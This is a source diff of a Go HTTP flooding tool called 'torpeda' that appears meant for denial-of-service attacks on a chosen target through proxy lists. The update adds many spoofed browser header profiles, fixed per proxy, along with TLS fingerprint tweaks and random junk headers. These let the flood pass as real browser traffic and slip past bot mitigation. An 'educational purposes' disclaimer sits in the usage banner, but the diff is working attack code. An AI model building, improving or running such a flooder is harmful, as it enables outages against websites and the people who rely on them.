@@ -25,7 +25,6 @@ import (
 	"github.com/panjf2000/ants/v2"
 	"h12.io/socks"
 	
-
 	"github.com/shirou/gopsutil/cpu"
 	"github.com/shirou/gopsutil/mem"
 )
@@ -52,9 +51,8 @@ var supportedVersions = []uint16{
 	tls.VersionTLS13,
 	tls.VersionTLS12,
 }
-
 var cipherSuites = []uint16{
-	0x3a3a,
+	0xCACA,
 	tls.TLS_AES_128_GCM_SHA256,
 	tls.TLS_AES_256_GCM_SHA384,
 	tls.TLS_CHACHA20_POLY1305_SHA256,
@@ -95,7 +93,7 @@ var (
 	cf       bool
 	usehttp1 bool
 	useJar	 bool
-	useDelay 	 bool
+	useDelay  bool
 
 	cookies         = ""
 	timeoutCount    int
@@ -110,7 +108,9 @@ var (
 	licenseVerified  = false
 	paths            []string
 	currentPathIndex int32
-	wg               sync.WaitGroup
+	mu               sync.Mutex    
+	proxyUserAgentMap = make(map[string]http.Header)
+ 	proxyMapMutex sync.Mutex
 
 	blockedDomains = []string{".gov", ".by",  ".edu", ".int", ".mil"}
 
@@ -191,11 +191,11 @@ func main() {
 	validMethods := []string{"GET", "POST", "HEAD", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH"}
 	if len(os.Args) < 7 {
 		fmt.Print("\033[H\033[2J")
-		fmt.Println(`	[flooder - golang] torpeda v0.7 // Updated: 17.11.2024 // Made with love :D
+		fmt.Println(`	[flooder - golang] torpeda v0.8 // Updated: 17.11.2024 // Made with love :D
 	Developers to method: @rapidreset aka mitigations / helped @benshii
 	WARNING: The method was done for educational purposes, all responsibility is on you!
 	Annoucement: @devtorpeda / @rapidreset
-	Features: bypass BFM, many options, support %RAND% in target, support rate like 4.7, support http/socks proxy
+	Features: many options, multi user-agents, support %RAND% in target, support rate like 4.7, support http/socks proxy
 	How to use & example:
 
 	go run h2pivo.go <reqmethod> <target> <time> <threads> <ratelimit> <proxyfile>
@@ -273,10 +273,6 @@ func main() {
 			if i+1 < len(os.Args) {
 				parseCustomHeaders(os.Args[i+1])
 			}
-		case "--cookie":
-			if i+1 < len(os.Args) {
-				customCookie = os.Args[i+1]
-			}
 		case "--ua":
 			if i+1 < len(os.Args) {
 				customUserAgent = os.Args[i+1]
@@ -284,6 +280,10 @@ func main() {
 		case "--referer":
 			if i+1 < len(os.Args) {
 				refererURL = os.Args[i+1]
+			}
+		case "--cookie":
+			if i+1 < len(os.Args) {
+				customCookie = os.Args[i+1]
 			}
 		case "--http1":
 			usehttp1 = true
@@ -421,59 +421,382 @@ func parseCookies(resp *http.Response) {
 	}
 }
 
-func randomHeader() http.Header {
+func randomHeader(proxy string) http.Header {
 	header := http.Header{}
-	parsedURL, err := url.Parse(target)
-	if err != nil {
-		os.Exit(1)
-	}
-	domain := parsedURL.Host
 
-	if usehttp1 {
+	browsers := []string{"winEdge", "winBrave", "winArc", "winOperaGX", "winYandex", "linuxBrave", "linuxOpera", "linuxBrave1", "macOpera", "macBrave", "macEdge"}
+	rand.Seed(time.Now().UnixNano())
+	browser := browsers[rand.Intn(len(browsers))]
+
+	switch browser {
+	case "macBrave":
 		header = http.Header{
-			"Host":                      []string{domain},
-			"Connection":                []string{"keep-alive"},
-			"Cache-Control":             []string{"max-age=0"},
-			"sec-ch-ua":                 []string{`"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"`},
-			"sec-ch-ua-mobile":          []string{"?0"},
-			"sec-ch-ua-platform":        []string{`"Windows"`},
-			"Upgrade-Insecure-Requests": []string{"1"},
-			"Accept":                    []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"},
-			"Sec-Fetch-Mode":            []string{"navigate"},
-			"Sec-Fetch-User":            []string{"?1"},
-			"Sec-Fetch-Dest":            []string{"document"},
-			"Accept-Language":           []string{"en-US,en;q=0.7"},
-			"Accept-Encoding":           []string{"gzip, deflate, br, zstd"},
-		}
-		if customUserAgent != "" {
-			header.Set("user-agent", customUserAgent)
-		} else {
-			header.Set("user-agent", `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36`)
-		}
-	} else {
-		header = http.Header{
-			"cache-control":             []string{"max-age=0"},
-			"sec-ch-ua":                 []string{`"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"`},
-			"sec-ch-ua-mobile":          []string{"?0"},
-			"sec-ch-ua-platform":        []string{`"Windows"`},
+			"cache-control":           []string{"max-age=0"},
+			"sec-ch-ua":               []string{`"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"`},
+			"sec-ch-ua-mobile":        []string{"?0"},
+			"sec-ch-ua-platform":      []string{`Macos"`},
 			"upgrade-insecure-requests": []string{"1"},
-			"accept":                    []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"},
-			"sec-gpc":                   []string{"1"},
-			"accept-language":           []string{"en-US,en;q=0.7"},
-			"sec-fetch-mode":            []string{"navigate"},
-			"sec-fetch-user":            []string{"?1"},
-			"sec-fetch-dest":            []string{"document"},
-			"accept-encoding":           []string{"gzip, deflate, br, zstd"},
-			"priority":                  []string{"u=0, i"},
+			"user-agent":              []string{"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"},
+			"accept":                  []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"},
+			"sec-gpc":                 []string{"1"},
+			"sec-fetch-mode":          []string{"navigate"},
+			"sec-fetch-user":          []string{"?1"},
+			"sec-fetch-dest":          []string{"document"},
+			"accept-encoding":         []string{"gzip, deflate, br, zstd"},
+			"accept-language":         []string{"en-US;en;q=0.9"},
+			"priority":				   []string{"u=0, i"},
 		}
-
-		if customUserAgent != "" {
-			header.Set("user-agent", customUserAgent)
-		} else {
-			header.Set("user-agent", `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36`)
+		header[http.HeaderOrderKey] = []string{
+			"cache-control",
+			"sec-ch-ua",
+			"sec-ch-ua-mobile",
+			"sec-ch-ua-platform",
+			"upgrade-insecure-requests",
+			"user-agent",
+			"accept",
+			"sec-gpc",
+			"sec-fetch-site",
+			"sec-fetch-mode",
+			"sec-fetch-user",
+			"sec-fetch-dest",
+			"accept-encoding",
+			"accept-language",
+			"priority",
+		}
+	case "macEdge":
+		header = http.Header{
+			"cache-control":           []string{"max-age=0"},
+			"sec-ch-ua":               []string{`"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"`},
+			"sec-ch-ua-mobile":        []string{"?0"},
+			"sec-ch-ua-platform":      []string{`"macOS\\"`},
+			"upgrade-insecure-requests": []string{"1"},
+			"user-agent":              []string{"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"},
+			"accept":                  []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
+			"sec-fetch-mode":          []string{"navigate"},
+			"sec-fetch-user":          []string{"?1"},
+			"sec-fetch-dest":          []string{"document"},
+			"accept-encoding":         []string{"gzip, deflate, br, zstd"},
+			"accept-language":         []string{"en-US,en;q=0.9"},
+			"priority":				   []string{"u=0, i"},
+		}
+		header[http.HeaderOrderKey] = []string{
+			"cache-control",
+			"sec-ch-ua",
+			"sec-ch-ua-mobile",
+			"sec-ch-ua-platform",
+			"upgrade-insecure-requests",
+			"user-agent",
+			"accept",
+			"sec-fetch-site",
+			"sec-fetch-mode",
+			"sec-fetch-user",
+			"sec-fetch-dest",
+			"accept-encoding",
+			"accept-language",
+			"priority",
+		}
+	case "macOpera":
+		header = http.Header{
+			"cache-control":           []string{"max-age=0"},
+			"sec-ch-ua":               []string{`"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"`},
+			"sec-ch-ua-mobile":        []string{"?0"},
+			"sec-ch-ua-platform":      []string{`"Macos"`},
+			"upgrade-insecure-requests": []string{"1"},
+			"user-agent":              []string{"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"},
+			"accept":                  []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
+			"sec-gpc":                 []string{"1"},
+			"sec-fetch-mode":          []string{"navigate"},
+			"sec-fetch-user":          []string{"?1"},
+			"sec-fetch-dest":          []string{"document"},
+			"accept-encoding":         []string{"gzip, deflate, br, zstd"},
+			"accept-language":         []string{"en-US;en;q=0.9"},
+			"priority":				   []string{"u=0, i"},
+		}
+		header[http.HeaderOrderKey] = []string{
+			"cache-control",
+			"sec-ch-ua",
+			"sec-ch-ua-mobile",
+			"sec-ch-ua-platform",
+			"upgrade-insecure-requests",
+			"user-agent",
+			"accept",
+			"sec-gpc",
+			"sec-fetch-site",
+			"sec-fetch-mode",
+			"sec-fetch-user",
+			"sec-fetch-dest",
+			"accept-encoding",
+			"accept-language",
+			"priority",
+		}
+	case "winBrave":
+		header = http.Header{
+			"cache-control":           []string{"max-age=0"},
+			"sec-ch-ua":               []string{`"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"`},
+			"sec-ch-ua-mobile":        []string{"?0"},
+			"sec-ch-ua-platform":      []string{`"Windows"`},
+			"upgrade-insecure-requests": []string{"1"},
+			"user-agent":              []string{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"},
+			"accept":                  []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"},
+			"sec-gpc":                 []string{"1"},
+			"accept-language":         []string{"en-US;en;q=0.9"},
+			"sec-fetch-mode":          []string{"navigate"},
+			"sec-fetch-user":          []string{"?1"},
+			"sec-fetch-dest":          []string{"document"},
+			"accept-encoding":         []string{"gzip, deflate, br, zstd"},
+			"priority":				   []string{"u=0, i"},
+		}
+		header[http.HeaderOrderKey] = []string{
+			"cache-control",
+			"sec-ch-ua",
+			"sec-ch-ua-mobile",
+			"sec-ch-ua-platform",
+			"upgrade-insecure-requests",
+			"user-agent",
+			"accept",
+			"sec-gpc",
+			"accept-language",
+			"sec-fetch-site",
+			"sec-fetch-mode",
+			"sec-fetch-user",
+			"sec-fetch-dest",
+			"accept-encoding",
+			"priority",
+		}
+	case "winArc":
+		header = http.Header{
+			"cache-control":           []string{"max-age=0"},
+			"sec-ch-ua":               []string{`"Chromium";v="131", "Not_A Brand";v="24"`},
+			"sec-ch-ua-mobile":        []string{"?0"},
+			"sec-ch-ua-platform":      []string{`"Windows"`},
+			"dnt":                     []string{"1"},
+			"upgrade-insecure-requests": []string{"1"},
+			"user-agent":              []string{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"},
+			"accept":                  []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
+			"sec-fetch-mode":          []string{"navigate"},
+			"sec-fetch-user":          []string{"?1"},
+			"sec-fetch-dest":          []string{"document"},
+			"accept-encoding":         []string{"gzip, deflate, br, zstd"},
+			"accept-language":         []string{"en-US,en;q=0.9"},
+			"priority":				   []string{"u=0, i"},
+		}
+		header[http.HeaderOrderKey] = []string{
+			"cache-control",
+			"sec-ch-ua",
+			"sec-ch-ua-mobile",
+			"sec-ch-ua-platform",
+			"dnt",
+			"upgrade-insecure-requests",
+			"user-agent",
+			"accept",
+			"sec-fetch-site",
+			"sec-fetch-mode",
+			"sec-fetch-user",
+			"sec-fetch-dest",
+			"accept-encoding",
+			"accept-language",
+			"priority",
+		}
+	case "winEdge":
+		header = http.Header{
+			"cache-control":           []string{"max-age=0"},
+			"sec-ch-ua":               []string{`"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"`},
+			"sec-ch-ua-mobile":        []string{"?0"},
+			"sec-ch-ua-platform":      []string{`"Windows"`},
+			"upgrade-insecure-requests": []string{"1"},
+			"user-agent":              []string{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"},
+			"accept":                  []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
+			"sec-fetch-mode":          []string{"navigate"},
+			"sec-fetch-user":          []string{"?1"},
+			"sec-fetch-dest":          []string{"document"},
+			"accept-encoding":         []string{"gzip, deflate, br, zstd"},
+			"accept-language":         []string{"en-US,en;q=0.9"},
+			"priority":				   []string{"u=0, i"},
+		}
+		header[http.HeaderOrderKey] = []string{
+			"cache-control",
+			"sec-ch-ua",
+			"sec-ch-ua-mobile",
+			"sec-ch-ua-platform",
+			"upgrade-insecure-requests",
+			"user-agent",
+			"accept",
+			"sec-fetch-site",
+			"sec-fetch-mode",
+			"sec-fetch-user",
+			"sec-fetch-dest",
+			"accept-encoding",
+			"accept-language",
+			"priority",
+		}
+	case "winOperaGX":
+		header = http.Header{
+			"cache-control":           []string{"max-age=0"},
+			"sec-ch-ua":               []string{`"Chromium";v="128", "Not;A=Brand";v="24", "Opera GX";v="114"`},
+			"sec-ch-ua-mobile":        []string{"?0"},
+			"sec-ch-ua-platform":      []string{`"Windows"`},
+			"upgrade-insecure-requests": []string{"1"},
+			"user-agent":              []string{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0"},
+			"accept":                  []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
+			"sec-fetch-mode":          []string{"navigate"},
+			"sec-fetch-user":          []string{"?1"},
+			"sec-fetch-dest":          []string{"document"},
+			"accept-encoding":         []string{"gzip, deflate, br, zstd"},
+			"accept-language":         []string{"en-US,en;q=0.9"},
+			"priority":				   []string{"u=0, i"},
+		}
+		header[http.HeaderOrderKey] = []string{
+			"cache-control",
+			"sec-ch-ua",
+			"sec-ch-ua-mobile",
+			"sec-ch-ua-platform",
+			"upgrade-insecure-requests",
+			"user-agent",
+			"accept",
+			"sec-fetch-site",
+			"sec-fetch-mode",
+			"sec-fetch-user",
+			"sec-fetch-dest",
+			"accept-encoding",
+			"accept-language",
+			"priority",
+		}
+	case "winYandex":
+		header = http.Header{
+			"cache-control":           []string{"max-age=0"},
+			"sec-ch-ua":               []string{`"Chromium";v="128", "Not;A=Brand";v="24", "YaBrowser";v="24.10", "Yowser";v="2.5"`},
+			"sec-ch-ua-mobile":        []string{"?0"},
+			"sec-ch-ua-platform":      []string{`"Windows"`},
+			"upgrade-insecure-requests": []string{"1"},
+			"user-agent":              []string{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 YaBrowser/24.10.0.0 Safari/537.36"},
+			"accept":                  []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
+			"sec-fetch-mode":          []string{"navigate"},
+			"sec-fetch-user":          []string{"?1"},
+			"sec-fetch-dest":          []string{"document"},
+			"accept-encoding":         []string{"gzip, deflate, br, zstd"},
+			"accept-language":         []string{"en-US;en;q=0.9"},
+			"priority":				   []string{"u=0, i"},
+		}
+		header[http.HeaderOrderKey] = []string{
+			"cache-control",
+			"sec-ch-ua",
+			"sec-ch-ua-mobile",
+			"sec-ch-ua-platform",
+			"upgrade-insecure-requests",
+			"user-agent",
+			"accept",
+			"sec-fetch-site",
+			"sec-fetch-mode",
+			"sec-fetch-user",
+			"sec-fetch-dest",
+			"accept-encoding",
+			"accept-language",
+			"priority",
+		}
+	case "linuxBrave":
+		header = http.Header{
+			"cache-control":           []string{"max-age=0"},
+			"sec-ch-ua":               []string{`"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"`},
+			"sec-ch-ua-mobile":        []string{"?0"},
+			"sec-ch-ua-platform":      []string{`"Linux"`},
+			"upgrade-insecure-requests": []string{"1"},
+			"user-agent":              []string{"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"},
+			"accept":                  []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"},
+			"sec-gpc":                 []string{"1"},
+			"accept-language":         []string{"en-US;en;q=0.9"},
+			"sec-fetch-mode":          []string{"navigate"},
+			"sec-fetch-user":          []string{"?1"},
+			"sec-fetch-dest":          []string{"document"},
+			"accept-encoding":         []string{"gzip, deflate, br, zstd"},
+			"priority":				   []string{"u=0, i"},
+		}
+		header[http.HeaderOrderKey] = []string{
+			"cache-control",
+			"sec-ch-ua",
+			"sec-ch-ua-mobile",
+			"sec-ch-ua-platform",
+			"upgrade-insecure-requests",
+			"user-agent",
+			"accept",
+			"sec-gpc",
+			"accept-language",
+			"sec-fetch-site",
+			"sec-fetch-mode",
+			"sec-fetch-user",
+			"sec-fetch-dest",
+			"accept-encoding",
+			"priority",
+		}
+	case "linuxBrave1":
+		header = http.Header{
+			"cache-control":           []string{"max-age=0"},
+			"sec-ch-ua":               []string{`"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"`},
+			"sec-ch-ua-mobile":        []string{"?0"},
+			"sec-ch-ua-platform":      []string{`"Linux"`},
+			"upgrade-insecure-requests": []string{"1"},
+			"user-agent":              []string{"Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"},
+			"accept":                  []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"},
+			"sec-gpc":                 []string{"1"},
+			"accept-language":         []string{"en-US;en;q=0.9"},
+			"sec-fetch-mode":          []string{"navigate"},
+			"sec-fetch-user":          []string{"?1"},
+			"sec-fetch-dest":          []string{"document"},
+			"accept-encoding":         []string{"gzip, deflate, br, zstd"},
+			"priority":				   []string{"u=0, i"},
+		}
+		header[http.HeaderOrderKey] = []string{
+			"cache-control",
+			"sec-ch-ua",
+			"sec-ch-ua-mobile",
+			"sec-ch-ua-platform",
+			"upgrade-insecure-requests",
+			"user-agent",
+			"accept",
+			"sec-gpc",
+			"accept-language",
+			"sec-fetch-site",
+			"sec-fetch-mode",
+			"sec-fetch-user",
+			"sec-fetch-dest",
+			"accept-encoding",
+			"priority",
+		}
+	case "linuxOpera":
+		header = http.Header{
+			"cache-control":           []string{"max-age=0"},
+			"sec-ch-ua":               []string{`"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"`},
+			"sec-ch-ua-mobile":        []string{"?0"},
+			"sec-ch-ua-platform":      []string{`"Linux"`},
+			"upgrade-insecure-requests": []string{"1"},
+			"user-agent":              []string{"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0"},
+			"accept":                  []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
+			"sec-gpc":                 []string{"1"},
+			"sec-fetch-mode":          []string{"navigate"},
+			"sec-fetch-user":          []string{"?1"},
+			"sec-fetch-dest":          []string{"document"},
+			"accept-encoding":         []string{"gzip, deflate, br, zstd"},
+			"accept-language":         []string{"en-US;en;q=0.9"},
+			"priority":				   []string{"u=0, i"},
+		}
+		header[http.HeaderOrderKey] = []string{
+			"cache-control",
+			"sec-ch-ua",
+			"sec-ch-ua-mobile",
+			"sec-ch-ua-platform",
+			"upgrade-insecure-requests",
+			"user-agent",
+			"accept",
+			"sec-gpc",
+			"sec-fetch-site",
+			"sec-fetch-mode",
+			"sec-fetch-user",
+			"sec-fetch-dest",
+			"accept-encoding",
+			"accept-language",
+			"priority",
 		}
 	}
-
+	
 	if refererURL == "rand" {
 		rand.Seed(time.Now().UnixNano())
 		header.Set("referer", randomReferers[rand.Intn(len(randomReferers))])
@@ -495,6 +818,11 @@ func randomHeader() http.Header {
 		header[randomKey] = []string{randstr(6)}
 	}
 
+	if extra {
+		randomKey := "fwfw4" + randstr(6)
+		header[randomKey] = []string{randstr(3)}
+	}
+
 	if reqmethod == "POST" {
 		header.Set("content-length", "0")
 		header.Set("content-type", "application/json")
@@ -508,44 +836,7 @@ func randomHeader() http.Header {
 	for key, value := range customHeaders {
 		header.Set(key, value)
 	}
-
-	if usehttp1 {
-		header[http.HeaderOrderKey] = []string{
-			"host",
-			"connection",
-			"cache-control",
-			"sec-ch-ua",
-			"sec-ch-ua-mobile",
-			"sec-ch-ua-platform",
-			"upgrade-insecure-requests",
-			"user-agent",
-			"accept",
-			"sec-fetch-site",
-			"sec-fetch-mode",
-			"sec-fetch-user",
-			"sec-fetch-dest",
-			"accept-encoding",
-			"accept-language",
-		}
-	} else {
-		header[http.HeaderOrderKey] = []string{
-			"cache-control",
-			"sec-ch-ua",
-			"sec-ch-ua-mobile",
-			"sec-ch-ua-platform",
-			"upgrade-insecure-requests",
-			"user-agent",
-			"accept",
-			"sec-gpc",
-			"accept-language",
-			"sec-fetch-site",
-			"sec-fetch-mode",
-			"sec-fetch-user",
-			"sec-fetch-dest",
-			"accept-encoding",
-			"priority",
-		}
-	}
+	
 	return header
 }
 
@@ -620,10 +911,9 @@ func start(proxy string) {
 		CurvePreferences:         supportedGroups,
 		CipherSuites:             cipherSuites,
 		ClientSessionCache:       tls.NewLRUClientSessionCache(0),
-		PreferServerCipherSuites: false,
+		PreferServerCipherSuites: true,
 		InsecureSkipVerify:       true,
 	}
-
 	if usehttp1 {
 		tlsConfig.NextProtos = []string{"http/1.1"}
 	} else {
@@ -674,7 +964,7 @@ func start(proxy string) {
 	}
 
 	client := &http.Client{
-		Timeout:   time.Second * 5,
+		Timeout:   time.Second * 10,
 		Transport: transport,
 	}
 
@@ -694,6 +984,14 @@ func start(proxy string) {
 		}
 	}
 
+	 proxyMapMutex.Lock()
+	 header, exists := proxyUserAgentMap[proxy]
+	 if !exists {
+		 header = randomHeader(proxy)
+		 proxyUserAgentMap[proxy] = header
+	 }
+	 proxyMapMutex.Unlock()
+
 	currentPath := getCurrentPath()
 	fullTarget := target + currentPath
 
@@ -703,7 +1001,7 @@ func start(proxy string) {
 		return
 	}
 
-	req.Header = randomHeader()
+	 req.Header = header
 
 	if customCookie != "" {
 		processedCookie := processCustomCookie(customCookie)
@@ -723,7 +1021,7 @@ func start(proxy string) {
 	if test {
 		ResponseBody(resp)
 	}
-
+	
 	atomic.AddInt32(&connections, 1)
 
 	rateLimit := time.NewTicker(time.Second / time.Duration(rps))
@@ -805,7 +1103,7 @@ func printStatuses() {
 ⠀⠜⢠⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣦⠄⣠⠀
 ⠠⢸⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿
 ⠀⠛⣿⣿⣿⡿⠏⠀⠀⠀⠀⠀⠀⢳⣾⣿⣿⣿⣿⣿⣿⡶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿`)
-		fmt.Println("> Version: v0.7")
+		fmt.Println("> Version: v0.8")
 		fmt.Println("> Request Method:", reqmethod)
 		fmt.Println("> Target:", target)
 		fmt.Println("> Time:", duration)
